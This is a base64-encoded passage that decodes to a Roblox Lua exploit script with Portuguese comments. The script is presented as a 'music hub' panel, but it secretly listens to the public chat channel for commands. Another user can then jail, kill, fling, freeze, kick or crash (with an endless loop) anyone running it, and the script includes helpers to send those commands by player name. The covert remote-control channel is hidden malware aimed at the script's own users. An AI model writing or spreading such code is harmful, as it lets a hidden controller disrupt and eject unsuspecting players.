tc2l6ZS8yKSksIFZlY3RvcjMubmV3KDAuOCwgc2l6ZSwgMC44KSwgQnJpY2tDb2xvci5uZXcoIlJlYWxseSBibGFjayIpKQogICAgICAgICAgICBjcmlhckJhcnJhKENGcmFtZS5uZXcocG9zICsgVmVjdG9yMy5uZXcoLXNpemUvMiwgMCwgLXNpemUvMikpLCBWZWN0b3IzLm5ldygwLjgsIHNpemUsIDAuOCksIEJyaWNrQ29sb3IubmV3KCJSZWFsbHkgYmxhY2siKSkKCiAgICAgICAgICAgIC0tIHRldG8gZSBjaMOjbwogICAgICAgICAgICBjcmlhckJhcnJhKENGcmFtZS5uZXcocG9zICsgVmVjdG9yMy5uZXcoMCwgc2l6ZS8yLCBzaXplLzIpKSwgVmVjdG9yMy5uZXcoc2l6ZSwgMC44LCAwLjgpLCBCcmlja0NvbG9yLm5ldygiSW5zdGl0dXRpb25hbCB3aGl0ZSIpKQogICAgICAgICAgICBjcmlhckJhcnJhKENGcmFtZS5uZXcocG9zICsgVmVjdG9yMy5uZXcoMCwgc2l6ZS8yLCAtc2l6ZS8yKSksIFZlY3RvcjMubmV3KHNpemUsIDAuOCwgMC44KSwgQnJpY2tDb2xvci5uZXcoIkluc3RpdHV0aW9uYWwgd2hpdGUiKSkKICAgICAgICAgICAgY3JpYXJCYXJyYShDRnJhbWUubmV3KHBvcyArIFZlY3RvcjMubmV3KHNpemUvMiwgc2l6ZS8yLCAwKSksIFZlY3RvcjMubmV3KDAuOCwgMC44LCBzaXplKSwgQnJpY2tDb2xvci5uZXcoIkluc3RpdHV0aW9uYWwgd2hpdGUiKSkKICAgICAgICAgICAgY3JpYXJCYXJyYShDRnJhbWUubmV3KHBvcyArIFZlY3RvcjMubmV3KC1zaXplLzIsIHNpemUvMiwgMCkpLCBWZWN0b3IzLm5ldygwLjgsIDAuOCwgc2l6ZSksIEJyaWNrQ29sb3IubmV3KCJJbnN0aXR1dGlvbmFsIHdoaXRlIikpCgogICAgICAgICAgICBjcmlhckJhcnJhKENGcmFtZS5uZXcocG9zICsgVmVjdG9yMy5uZXcoMCwgLXNpemUvMiwgc2l6ZS8yKSksIFZlY3RvcjMubmV3KHNpemUsIDAuOCwgMC44KSwgQnJpY2tDb2xvci5uZXcoIkluc3RpdHV0aW9uYWwgd2hpdGUiKSkKICAgICAgICAgICAgY3JpYXJCYXJyYShDRnJhbWUubmV3KHBvcyArIFZlY3RvcjMubmV3KDAsIC1zaXplLzIsIC1zaXplLzIpKSwgVmVjdG9yMy5uZXcoc2l6ZSwgMC44LCAwLjgpLCBCcmlja0NvbG9yLm5ldygiSW5zdGl0dXRpb25hbCB3aGl0ZSIpKQogICAgICAgICAgICBjcmlhckJhcnJhKENGcmFtZS5uZXcocG9zICsgVmVjdG9yMy5uZXcoc2l6ZS8yLCAtc2l6ZS8yLCAwKSksIFZlY3RvcjMubmV3KDAuOCwgMC44LCBzaXplKSwgQnJpY2tDb2xvci5uZXcoIkluc3RpdHV0aW9uYWwgd2hpdGUiKSkKICAgICAgICAgICAgY3JpYXJCYXJyYShDRnJhbWUubmV3KHBvcyArIFZlY3RvcjMubmV3KC1zaXplLzIsIC1zaXplLzIsIDApKSwgVmVjdG9yMy5uZXcoMC44LCAwLjgsIHNpemUpLCBCcmlja0NvbG9yLm5ldygiSW5zdGl0dXRpb25hbCB3aGl0ZSIpKQoKICAgICAgICAgICAgLS0gY2FzbyBqw6EgZXhpc3RhIGNvbmV4w6NvIGFudGlnYQogICAgICAgICAgICBpZiBqYWlsQ29ubmVjdGlvbnNbcGxheWVyTmFtZV0gdGhlbiAKICAgICAgICAgICAgICAgIGphaWxDb25uZWN0aW9uc1twbGF5ZXJOYW1lXTpEaXNjb25uZWN0KCkgCiAgICAgICAgICAgIGVuZAoKICAgICAgICAgICAgLS0gQ09SUkXDh8ODTyBQUklOQ0lQQUw6IHVzYXIgbyAicGxheWVyIiAoYWx2bykgZW0gdmV6IGRvIExvY2FsUGxheWVyCiAgICAgICAgICAgIGphaWxDb25uZWN0aW9uc1twbGF5ZXJOYW1lXSA9IFJ1blNlcnZpY2UuSGVhcnRiZWF0OkNvbm5lY3QoZnVuY3Rpb24oKQogICAgICAgICAgICAgICAgaWYgcGxheWVyLkNoYXJhY3RlciBhbmQgcGxheWVyLkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiSHVtYW5vaWRSb290UGFydCIpIHRoZW4KICAgICAgICAgICAgICAgICAgICBsb2NhbCBocnAgPSBwbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkUm9vdFBhcnQKCiAgICAgICAgICAgICAgICAgICAgLS0gc2UgdGVudGFyIHNhaXIsIHZvbHRhIHBybyBjZW50cm8gZGEgY2VsYQogICAgICAgICAgICAgICAgICAgIGlmIChocnAuUG9zaXRpb24gLSBwb3MpLk1hZ25pdHVkZSA+IHNpemUvMiAtIDEgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICBocnAuQ0ZyYW1lID0gQ0ZyYW1lLm5ldyhwb3MpCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgZW5kKQogICAgICAgIGVuZAogICAgZW5kCgogICAgcmV0dXJuCgplbHNlaWYgY29tYW5kbyA9PSAidW5qYWlsIiB0aGVuCiAgICBpZiBjaGFyYWN0ZXIgdGhlbgogICAgICAgIGxvY2FsIGh1bWFub2lkID0gY2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkT2ZDbGFzcygiSHVtYW5vaWQiKQogICAgICAgIGlmIGh1bWFub2lkIHRoZW4KICAgICAgICAgICAgaHVtYW5vaWQuV2Fsa1NwZWVkID0gcGxheWVyT3JpZ2luYWxTcGVlZFtwbGF5ZXJOYW1lXSBvciAxNgogICAgICAgICAgICBwbGF5ZXJPcmlnaW5hbFNwZWVkW3BsYXllck5hbWVdID0gbmlsCiAgICAgICAgZW5kCiAgICAgICAgaWYgamF1bGFzW3BsYXllck5hbWVdIHRoZW4KICAgICAgICAgICAgZm9yIF8sIHAgaW4gaXBhaXJzKGphdWxhc1twbGF5ZXJOYW1lXSkgZG8KICAgICAgICAgICAgICAgIGlmIHAgYW5kIHAuUGFyZW50IHRoZW4gcDpEZXN0cm95KCkgZW5kCiAgICAgICAgICAgIGVuZAogICAgICAgICAgICBqYXVsYXNbcGxheWVyTmFtZV0gPSBuaWwKICAgICAgICBlbmQKICAgICAgICBpZiBqYWlsQ29ubmVjdGlvbnNbcGxheWVyTmFtZV0gdGhlbgogICAgICAgICAgICBqYWlsQ29ubmVjdGlvbnNbcGxheWVyTmFtZV06RGlzY29ubmVjdCgpCiAgICAgICAgICAgIGphaWxDb25uZWN0aW9uc1twbGF5ZXJOYW1lXSA9IG5pbAogICAgICAgIGVuZAogICAgZW5kCiAgICByZXR1cm4KCmVsc2VpZiBjb21hbmRvID09ICJqdW1wczEiIHRoZW4gVHJpZ2dlckp1bXBzY2FyZShMb2NhbFBsYXllciwgSlVNUFNDQVJFU1sxXSkKZWxzZWlmIGNvbWFuZG8gPT0gImp1bXBzMiIgdGhlbiBUcmlnZ2VySnVtcHNjYXJlKExvY2FsUGxheWVyLCBKVU1QU0NBUkVTWzJdKQplbHNlaWYgY29tYW5kbyA9PSAianVtcHMzIiB0aGVuIFRyaWdnZXJKdW1wc2NhcmUoTG9jYWxQbGF5ZXIsIEpVTVBTQ0FSRVNbM10pCmVsc2VpZiBjb21hbmRvID09ICJqdW1wczQiIHRoZW4gVHJpZ2dlckp1bXBzY2FyZShMb2NhbFBsYXllciwgSlVNUFNDQVJFU1s0XSkKCmVsc2VpZiBjb21hbmRvID09ICJraWxsIiBhbmQgY2hhcmFjdGVyIHRoZW4KICAgIGNoYXJhY3RlcjpCcmVha0pvaW50cygpCgplbHNlaWYgY29tYW5kbyA9PSAia2ljayIgdGhlbgogICAgTG9jYWxQbGF5ZXI6S2ljaygi4pqg77iP77ixT29wcyFcblxuWW91IGhhdmUgYmVlbiBraWNrZWQgYnkgc29tZW9uZS4iKQoKZWxzZWlmIGNvbWFuZG8gPT0gImNyYXNoIiB0aGVuCiAgICB3aGlsZSB0cnVlIGRvIGVuZAoKZWxzZWlmIGNvbWFuZG8gPT0gImV4cGxvZGUiIGFuZCBjaGFyYWN0ZXIgdGhlbgogICAgbG9jYWwgaHVtYW5vaWRSb290UGFydCA9IGNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiSHVtYW5vaWRSb290UGFydCIpCiAgICBpZiBodW1hbm9pZFJvb3RQYXJ0IHRoZW4KICAgICAgICBsb2NhbCBleHBsb3Npb24gPSBJbnN0YW5jZS5uZXcoIlBhcnQiKQogICAgICAgIGV4cGxvc2lvbi5OYW1lID0gIkx5bnhzRXhwbG9zaW9uIgogICAgICAgIGV4cGxvc2lvbi5TaXplID0gVmVjdG9yMy5uZXcoOCw4LDgpCiAgICAgICAgZXhwbG9zaW9uLlNoYXBlID0gRW51bS5QYXJ0VHlwZS5CYWxsCiAgICAgICAgZXhwbG9zaW9uLk1hdGVyaWFsID0gRW51bS5NYXRlcmlhbC5OZW9uCiAgICAgICAgZXhwbG9zaW9uLkJyaWNrQ29sb3IgPSBCcmlja0NvbG9yLm5ldygiSW5zdGl0dXRpb25hbCB3aGl0ZSIpCiAgICAgICAgZXhwbG9zaW9uLlBvc2l0aW9uID0gaHVtYW5vaWRSb290UGFydC5Qb3NpdGlvbgogICAgICAgIGV4cGxvc2lvbi5BbmNob3JlZCA9IHRydWUKICAgICAgICBleHBsb3Npb24uQ2FuQ29sbGlkZSA9IGZhbHNlCiAgICAgICAgZXhwbG9zaW9uLlBhcmVudCA9IFdvcmtzcGFjZQogICAgICAgIGxvY2FsIHBvaW50TGlnaHQgPSBJbnN0YW5jZS5uZXcoIlBvaW50TGlnaHQiKQogICAgICAgIHBvaW50TGlnaHQuQnJpZ2h0bmVzcyA9IDEwCiAgICAgICAgcG9pbnRMaWdodC5SYW5nZSA9IDE1CiAgICAgICAgcG9pbnRMaWdodC5Db2xvciA9IENvbG9yMy5uZXcoMSwxLDEpCiAgICAgICAgcG9pbnRMaWdodC5QYXJlbnQgPSBleHBsb3Npb24KICAgICAgICBjaGFyYWN0ZXI6QnJlYWtKb2ludHMoKQogICAgICAgIGZvciBfLCBwYXJ0IGluIHBhaXJzKGNoYXJhY3RlcjpHZXREZXNjZW5kYW50cygpKSBkbwogICAgICAgICAgICBpZiBwYXJ0OklzQSgiQmFzZVBhcnQiKSBhbmQgcGFydCB+PSBodW1hbm9pZFJvb3RQYXJ0IHRoZW4KICAgICAgICAgICAgICAgIHBhcnQuVmVsb2NpdHkgPSBWZWN0b3IzLm5ldyhtYXRoLnJhbmRvbSgtNTAsNTApLG1hdGgucmFuZG9tKDMwLDYwKSxtYXRoLnJhbmRvbSgtNTAsNTApKQogICAgICAgICAgICBlbmQKICAgICAgICBlbmQKICAgICAgICBsb2NhbCB0d2VlbkluZm8gPSBUd2VlbkluZm8ubmV3KDAuNSwgRW51bS5FYXNpbmdTdHlsZS5RdWFkLCBFbnVtLkVhc2luZ0RpcmVjdGlvbi5PdXQpCiAgICAgICAgVHdlZW5TZXJ2aWNlOkNyZWF0ZShleHBsb3Npb24sIHR3ZWVuSW5mbywge1NpemUgPSBWZWN0b3IzLm5ldygyMCwyMCwyMCl9KTpQbGF5KCkKICAgICAgICBnYW1lOkdldFNlcnZpY2UoIkRlYnJpcyIpOkFkZEl0ZW0oZXhwbG9zaW9uLDIpCiAgICBlbmQKCmVsc2VpZiBjb21hbmRvID09ICJza3lmcmVlemUiIGFuZCBjaGFyYWN0ZXIgdGhlbgogICAgbG9jYWwgaHJwID0gY2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKCJIdW1hbm9pZFJvb3RQYXJ0IikKICAgIGlmIGhycCB0aGVuCiAgICAgICAgbG9jYWwgb3AgPSBocnAuQ0ZyYW1lCiAgICAgICAgaHJwLkNGcmFtZSA9IGhycC5DRnJhbWUgKyBWZWN0b3IzLm5ldygwLDIwMCwwKQogICAgICAgIGNoYXJhY3Rlci5IdW1hbm9pZC5XYWxrU3BlZWQgPSAwCiAgICAgICAgY2hhcmFjdGVyLkh1bWFub2lkLkp1bXBQb3dlciA9IDAKICAgICAgICB0YXNrLndhaXQoNCkKICAgICAgICBjaGFyYWN0ZXIuSHVtYW5vaWQuV2Fsa1NwZWVkID0gMTYKICAgICAgICBjaGFyYWN0ZXIuSHVtYW5vaWQuSnVtcFBvd2VyID0gNTAKICAgICAgICBocnAuQ0ZyYW1lID0gb3AKICAgIGVuZAoKZWxzZWlmIGNvbWFuZG8gPT0gImtpbGxqdW1wIiBhbmQgY2hhcmFjdGVyIHRoZW4KICAgIF9HWyJLSl8iLi5hbHZvLk5hbWVdID0gdHJ1ZQogICAgbG9jYWwgaCA9IGNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiSHVtYW5vaWQiKQogICAgaWYgaCB0aGVuCiAgICAgICAgaC5TdGF0ZUNoYW5nZWQ6Q29ubmVjdChmdW5jdGlvbihfLCBzKQogICAgICAgICAgICBpZiBfR1siS0pfIi4uYWx2by5OYW1lXSBhbmQgcyA9PSBFbnVtLkh1bWFub2lkU3RhdGVUeXBlLkp1bXBpbmcgdGhlbgogICAgICAgICAgICAgICAgbG9jYWwgaHJwID0gY2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKCJIdW1hbm9pZFJvb3RQYXJ0IikKICAgICAgICAgICAgICAgIGlmIGhycCB0aGVuCiAgICAgICAgICAgICAgICAgICAgaHJwLlZlbG9jaXR5ID0gVmVjdG9yMy5uZXcobWF0aC5yYW5kb20oLTMwMDAsMzAwMCksbWF0aC5yYW5kb20oMjAwMCw0MDAwKSxtYXRoLnJhbmRvbSgtMzAwMCwzMDAwKSkKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICBlbmQKICAgICAgICBlbmQpCiAgICBlbmQKCmVsc2VpZiBjb21hbmRvID09ICJ1bmtpbGxqdW1wIiBhbmQgY2hhcmFjdGVyIHRoZW4KICAgIF9HWyJLSl8iLi5hbHZvLk5hbWVdID0gZmFsc2UKCgoKZWxzZWlmIGNvbWFuZG8gPT0gImZsaW5nIiBhbmQgY2hhcmFjdGVyIHRoZW4KICAgIGxvY2FsIGhycCA9IGNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiSHVtYW5vaWRSb290UGFydCIpCiAgICBpZiBocnAgdGhlbgogICAgICAgIGxvY2FsIGZsYXNoID0gSW5zdGFuY2UubmV3KCJQYXJ0IikKICAgICAgICBmbGFzaC5OYW1lID0gIkZsaW5nRmxhc2giCiAgICAgICAgZmxhc2guU2l6ZSA9IFZlY3RvcjMubmV3KDgwLDgwLDgwKQogICAgICAgIGZsYXNoLlNoYXBlID0gRW51bS5QYXJ0VHlwZS5CYWxsCiAgICAgICAgZmxhc2guTWF0ZXJpYWwgPSBFbnVtLk1hdGVyaWFsLk5lb24KICAgICAgICBmbGFzaC5Ccmlja0NvbG9yID0gQnJpY2tDb2xvci5uZXcoIkJyaWdodCBibHVlIikKICAgICAgICBmbGFzaC5Qb3NpdGlvbiA9IGhycC5Qb3NpdGlvbgogICAgICAgIGZsYXNoLkFuY2hvcmVkID0gdHJ1ZQogICAgICAgIGZsYXNoLkNhbkNvbGxpZGUgPSBmYWxzZQogICAgICAgIGZsYXNoLlBhcmVudCA9IFdvcmtzcGFjZQogICAgICAgIGxvY2FsIGZsYXNoTGlnaHQgPSBJbnN0YW5jZS5uZXcoIlBvaW50TGlnaHQiKQogICAgICAgIGZsYXNoTGlnaHQuQnJpZ2h0bmVzcyA9IDUwCiAgICAgICAgZmxhc2hMaWdodC5SYW5nZSA9IDEyMAogICAgICAgIGZsYXNoTGlnaHQuQ29sb3IgPSBDb2xvcjMubmV3KDAsMCwxKQogICAgICAgIGZsYXNoTGlnaHQuUGFyZW50ID0gZmxhc2gKICAgICAgICB3YWl0KDAuMjUpCiAgICAgICAgaHJwLlZlbG9jaXR5ID0gVmVjdG9yMy5uZXcobWF0aC5yYW5kb20oLTJlNywyZTcpLG1hdGgucmFuZG9tKDVlNiwxZTcpLG1hdGgucmFuZG9tKC0yZTcsMmU3KSkKICAgICAgICBnYW1lOkdldFNlcnZpY2UoIkRlYnJpcyIpOkFkZEl0ZW0oZmxhc2gsMSkKICAgIGVuZAoKZWxzZWlmIGNvbWFuZG8gPT0gImJyaW5nIiBhbmQgY2hhcmFjdGVyIHRoZW4KICAgIGxvY2FsIGhycCA9IGNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiSHVtYW5vaWRSb290UGFydCIpCiAgICBpZiBocnAgdGhlbgogICAgICAgIGZvciBfLCBwbGF5ZXIgaW4gaXBhaXJzKFBsYXllcnM6R2V0UGxheWVycygpKSBkbwogICAgICAgICAgICBpZiBwbGF5ZXIgfj0gTG9jYWxQbGF5ZXIgYW5kIHBsYXllci5DaGFyYWN0ZXIgYW5kIHBsYXllci5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIkh1bWFub2lkUm9vdFBhcnQiKSB0aGVuCiAgICAgICAgICAgICAgICBsb2NhbCBzZW5kZXJSb290UGFydCA9IHBsYXllci5DaGFyYWN0ZXIuSHVtYW5vaWRSb290UGFydAogICAgICAgICAgICAgICAgbG9jYWwgYnJpbmdFZmZlY3QgPSBJbnN0YW5jZS5uZXcoIlBhcnQiKQogICAgICAgICAgICAgICAgYnJpbmdFZmZlY3QuTmFtZSA9ICJCcmluZ0VmZmVjdCIKICAgICAgICAgICAgICAgIGJyaW5nRWZmZWN0LlNpemUgPSBWZWN0b3IzLm5ldyg2LCA2LCA2KQogICAgICAgICAgICAgICAgYnJpbmdFZmZlY3QuU2hhcGUgPSBFbnVtLlBhcnRUeXBlLkJhbGwKICAgICAgICAgICAgICAgIGJyaW5nRWZmZWN0Lk1hdGVyaWFsID0gRW51bS5NYXRlcmlhbC5OZW9uCiAgICAgICAgICAgICAgICBicmluZ0VmZmVjdC5Ccmlja0NvbG9yID0gQnJpY2tDb2xvci5uZXcoIkJyaWdodCBncmVlbiIpCiAgICAgICAgICAgICAgICBicmluZ0VmZmVjdC5Qb3NpdGlvbiA9IGhycC5Qb3NpdGlvbgogICAgICAgICAgICAgICAgYnJpbmdFZmZlY3QuQW5jaG9yZWQgPSB0cnVlCiAgICAgICAgICAgICAgICBicmluZ0VmZmVjdC5DYW5Db2xsaWRlID0gZmFsc2UKICAgICAgICAgICAgICAgIGJyaW5nRWZmZWN0LlBhcmVudCA9IFdvcmtzcGFjZQogICAgICAgICAgICAgICAgbG9jYWwgYnJpbmdMaWdodCA9IEluc3RhbmNlLm5ldygiUG9pbnRMaWdodCIpCiAgICAgICAgICAgICAgICBicmluZ0xpZ2h0LkJyaWdodG5lc3MgPSA4CiAgICAgICAgICAgICAgICBicmluZ0xpZ2h0LlJhbmdlID0gMTUKICAgICAgICAgICAgICAgIGJyaW5nTGlnaHQuQ29sb3IgPSBDb2xvcjMubmV3KDAsIDEsIDApCiAgICAgICAgICAgICAgICBicmluZ0xpZ2h0LlBhcmVudCA9IGJyaW5nRWZmZWN0CiAgICAgICAgICAgICAgICBsb2NhbCB0d2VlbkluZm8gPSBUd2VlbkluZm8ubmV3KDAuMywgRW51bS5FYXNpbmdTdHlsZS5RdWFkLCBFbnVtLkVhc2luZ0RpcmVjdGlvbi5PdXQpCiAgICAgICAgICAgICAgICBUd2VlblNlcnZpY2U6Q3JlYXRlKGJyaW5nRWZmZWN0LCB0d2VlbkluZm8sIHtTaXplID0gVmVjdG9yMy5uZXcoMTIsIDEyLCAxMiksIFRyYW5zcGFyZW5jeSA9IDAuOH0pOlBsYXkoKQogICAgICAgICAgICAgICAgbG9jYWwgdGFyZ2V0UG9zaXRpb24gPSBzZW5kZXJSb290UGFydC5Qb3NpdGlvbiArIHNlbmRlclJvb3RQYXJ0LkNGcmFtZS5Mb29rVmVjdG9yICogNQogICAgICAgICAgICAgICAgaHJwLlBvc2l0aW9uID0gdGFyZ2V0UG9zaXRpb24gKyBWZWN0b3IzLm5ldygwLCAzLCAwKQogICAgICAgICAgICAgICAgZ2FtZTpHZXRTZXJ2aWNlKCJEZWJyaXMiKTpBZGRJdGVtKGJyaW5nRWZmZWN0LDEpCiAgICAgICAgICAgICAgICBicmVhawogICAgICAgICAgICBlbmQKICAgICAgICBlbmQKICAgIGVuZAplbmQKICAgICAgICBlbmQKICAgIGVuZAplbmQKCnRhc2suc3Bhd24oZnVuY3Rpb24oKQogICAgd2FpdCgzKQogICAgbG9jYWwgY2FuYWwgPSBUZXh0Q2hhdFNlcnZpY2UuVGV4dENoYW5uZWxzOkZpbmRGaXJzdENoaWxkKCJSQlhHZW5lcmFsIikKICAgIGlmIGNhbmFsIHRoZW4KICAgICAgICBjYW5hbC5PbkluY29taW5nTWVzc2FnZSA9IGZ1bmN0aW9uKG1lbnNhZ2VtKQogICAgICAgICAgICBQcm9jZXNzYXJDb21hbmRvKG1lbnNhZ2VtLlRleHQpCiAgICAgICAgZW5kCiAgICBlbmQKZW5kKQoKbG9jYWwgZnVuY3Rpb24gY3JlYXRlR3JhZGllbnRBbmltKG9iaiwgY29sb3JTZXEsIHNwZWVkKQogICAgbG9jYWwgZ3JhZCA9IEluc3RhbmNlLm5ldygiVUlHcmFkaWVudCIsIG9iaikKICAgIGdyYWQuQ29sb3IgPSBjb2xvclNlcQogICAgc3Bhd24oZnVuY3Rpb24oKQogICAgICAgIGxvY2FsIHQwID0gdGljaygpCiAgICAgICAgd2hpbGUgZ3JhZC5QYXJlbnQgZG8gZ3JhZC5PZmZzZXQgPSBWZWN0b3IyLm5ldygwLjUrMC41Km1hdGguc2luKCh0aWNrKCktdDApKnNwZWVkKSwwKSB3YWl0KDAuMDEpIGVuZAogICAgZW5kKQogICAgcmV0dXJuIGdyYWQKZW5kCgpsb2NhbCBmdW5jdGlvbiBzdHlsZUJ1dHRvbihidG4sIGN1c3RvbVNlcSkKICAgIGxvY2FsIHNlcSA9IGN1c3RvbVNlcSBvciBDb2xvclNlcXVlbmNlLm5ld3sKICAgICAgICBDb2xvclNlcXVlbmNlS2V5cG9pbnQubmV3KDAsIENvbG9yMy5mcm9tUkdCKDEyOCwwLDI1NSkpLAogICAgICAgIENvbG9yU2VxdWVuY2VLZXlwb2ludC5uZXcoMC41LCBDb2xvcjMuZnJvbVJHQigxMDAsMCwxNzApKSwKICAgICAgICBDb2xvclNlcXVlbmNlS2V5cG9pbnQubmV3KDEuMCwgQ29sb3IzLmZyb21SR0IoMjU1LDI1NSwyNTUpKSwKICAgIH0KICAgIGNyZWF0ZUdyYWRpZW50QW5pbShidG4sIHNlcSwgMS42KQogICAgYnRuLk1vdXNlRW50ZXI6Q29ubmVjdChmdW5jdGlvbigpIGJ0bi5CYWNrZ3JvdW5kQ29sb3IzID0gQ29sb3IzLmZyb21SR0IoMTI4LDAsMjU1KSBidG4uVGV4dENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDI1NSwyNTUsMjU1KSBlbmQpCiAgICBidG4uTW91c2VMZWF2ZTpDb25uZWN0KGZ1bmN0aW9uKCkKICAgICAgICBpZiBidG46SXNBKCJUZXh0QnV0dG9uIikgdGhlbgogICAgICAgICAgICBpZiBidG4uQmFja2dyb3VuZENvbG9yMyB+PSBDb2xvcjMuZnJvbVJHQigwLDI1NSwwKSBhbmQgYnRuLkJhY2tncm91bmRDb2xvcjMgfj0gQ29sb3IzLmZyb21SR0IoMjU1LDAsMCkgdGhlbgogICAgICAgICAgICAgICAgYnRuLkJhY2tncm91bmRDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQigwLDAsMCkKICAgICAgICAgICAgICAgIGJ0bi5UZXh0Q29sb3IzID0gQ29sb3IzLmZyb21SR0IoMTI4LDAsMjU1KQogICAgICAgICAgICBlbmQKICAgICAgICBlbmQKICAgIGVuZCkKZW5kCgpsb2NhbCBzZWxlY3RlZFBsYXllciA9IG5pbApsb2NhbCBwbGF5ZXJCdXR0b25SZWZzID0ge30KCmxvY2FsIGZ1bmN0aW9uIFNlbmRDb21tYW5kKG1zZykKICAgIGlmIFRleHRDaGF0U2VydmljZS5DaGF0VmVyc2lvbiA9PSBFbnVtLkNoYXRWZXJzaW9uLlRleHRDaGF0U2VydmljZSB0aGVuCiAgICAgICAgbG9jYWwgY2hhbm5lbCA9IFRleHRDaGF0U2VydmljZS5UZXh0Q2hhbm5lbHMuUkJYR2VuZXJhbAogICAgICAgIGlmIGNoYW5uZWwgdGhlbiBjaGFubmVsOlNlbmRBc3luYyhtc2cpIGVuZAogICAgZWxzZQogICAgICAgIFJlcGxpY2F0ZWRTdG9yYWdlLkRlZmF1bHRDaGF0U3lzdGVtQ2hhdEV2ZW50cy5TYXlNZXNzYWdlUmVxdWVzdDpGaXJlU2VydmVyKG1zZywgIkFsbCIpCiAgICBlbmQKZW5kCgpsb2NhbCBmdW5jdGlvbiBTZW5kVG9TZWxlY3RlZFBsYXllcihjbWQpCiAgICBpZiBzZWxlY3RlZFBsYXllciB0aGVuCiAgICAgICAgU2VuZENvbW1hbmQoIjsiIC4uIGNtZCAuLiAiICIgLi4gc2VsZWN0ZWRQbGF5ZXIuTmFtZSkKICAgIGVuZAplbmQKCmxvY2FsIGZ1bmN0aW9uIENyZWF0ZUFkbWluVUkoKQogICAgbG9jYWwgdmlvbGV0ID0gQ29sb3IzLmZyb21SR0IoMTI4LDAsMjU1KQogICAgbG9jYWwgYWNjZW50QmcgPSBDb2xvcjMuZnJvbVJHQigwLDAsMCkKICAgIGlmIENvcmVHdWk6RmluZEZpcnN0Q2hpbGQoIkF1cmFseW54TXVzaWNIdWIiKSB0aGVuCiAgICAgICAgLS0gVUkgbsOjbyBkZXN0cm9pIG1haXggaGVoZSAKICAgICAgICAtLSBDb3JlR3VpLkF1cmFseW54TXVzaWNIdWI6RGVzdHJveSgpCiAgICBlbmQKICAgIGxvY2FsIHNjcmVlbkd1aSA9IEluc3RhbmNlLm5ldygiU2NyZWVuR3VpIikKICAgIHNjcmVlbkd1aS5OYW1lID0gIkF1cmFseW54TXVzaWNIdWIiCiAgICBzY3JlZW5HdWkuUmVzZXRPblNwYXduID0gZmFsc2UKICAgIHNjcmVlbkd1aS5QYXJlbnQgPSBDb3JlR3VpCiAgICBsb2NhbCBtYWluRnJhbWUgPSBJbnN0YW5jZS5uZXcoIkZyYW1lIikKICAgIG1haW5GcmFtZS5OYW1lID0gIkF1cmFseW54TXVzaWNNYWluIgogICAgbWFpbkZyYW1lLlNpemUgPSBVRGltMi5uZXcoMCwgMzgwLCAwLCA1MTApCiAgICBtYWluRnJhbWUuQW5jaG9yUG9pbnQgPSBWZWN0b3IyLm5ldygwLjUsIDAuNSkKICAgIG1haW5GcmFtZS5Qb3NpdGlvbiA9IFVEaW0yLm5ldygwLjUsIDAsIDAuNSwgMCkKICAgIG1haW5GcmFtZS5CYWNrZ3JvdW5kQ29sb3IzID0gYWNjZW50QmcKICAgIG1haW5GcmFtZS5Cb3JkZXJTaXplUGl4ZWwgPSAwCiAgICBtYWluRnJhbWUuUGFyZW50ID0gc2NyZWVuR3VpCiAgICBtYWluRnJhbWUuQWN0aXZlID0gdHJ1ZQogICAgbWFpbkZyYW1lLkRyYWdnYWJsZSA9IHRydWUKICAgIEluc3RhbmNlLm5ldygiVUlDb3JuZXIiLCBtYWluRnJhbWUpLkNvcm5lclJhZGl1cyA9IFVEaW0ubmV3KDAsIDIwKQogICAgbG9jYWwgbWFpblN0cm9rZSA9IEluc3RhbmNlLm5ldygiVUlTdHJva2UiLCBtYWluRnJhbWUpCiAgICBtYWluU3Ryb2tlLlRoaWNrbmVzcyA9IDIKICAgIG1haW5TdHJva2UuVHJhbnNwYXJlbmN5ID0gMC4yMgogICAgbWFpblN0cm9rZS5BcHBseVN0cm9rZU1vZGUgPSBFbnVtLkFwcGx5U3Ryb2tlTW9kZS5Cb3JkZXIKICAgIG1haW5TdHJva2UuQ29sb3IgPSBDb2xvcjMuZnJvbVJHQigxMjgsMCwyNTUpCiAgICBsb2NhbCBncmFkTWFpbkJvcmRlciA9IEluc3RhbmNlLm5ldygiVUlHcmFkaWVudCIsIG1haW5TdHJva2UpCiAgICBncmFkTWFpbkJvcmRlci5Db2xvciA9IENvbG9yU2VxdWVuY2UubmV3ewogICAgICAgIENvbG9yU2VxdWVuY2VLZXlwb2ludC5uZXcoMCwgQ29sb3IzLmZyb21SR0IoMTI4LDAsMjU1KSksCiAgICAgICAgQ29sb3JTZXF1ZW5jZUtleXBvaW50Lm5ldygwLjQ1LCBDb2xvcjMuZnJvbVJHQig4MCwwLDE0MCkpLAogICAgICAgIENvbG9yU2VxdWVuY2VLZXlwb2ludC5uZXcoMC43LCBDb2xvcjMuZnJvbVJHQigyMzAsMTgwLDI1NSkpLAogICAgICAgIENvbG9yU2VxdWVuY2VLZXlwb2ludC5uZXcoMS4wLCBDb2xvcjMuZnJvbVJHQigyNTUsMjU1LDI1NSkpLAogICAgfQogICAgc3Bhd24oZnVuY3Rpb24oKQogICAgICAgIGxvY2FsIHQwID0gdGljaygpCiAgICAgICAgd2hpbGUgZ3JhZE1haW5Cb3JkZXIuUGFyZW50IGRvIGdyYWRNYWluQm9yZGVyLk9mZnNldCA9IFZlY3RvcjIubmV3KDAuNSswLjUqbWF0aC5zaW4oKHRpY2soKS10MCkqMS42KSwwKSB3YWl0KDAuMDMpIGVuZAogICAgZW5kKQogICAgbG9jYWwgaGVhZGVyID0gSW5zdGFuY2UubmV3KCJGcmFtZSIsIG1haW5GcmFtZSkKICAgIGhlYWRlci5TaXplID0gVURpbTIubmV3KDEsIDAsIDAsIDYwKQogICAgaGVhZGVyLkJhY2tncm91bmRDb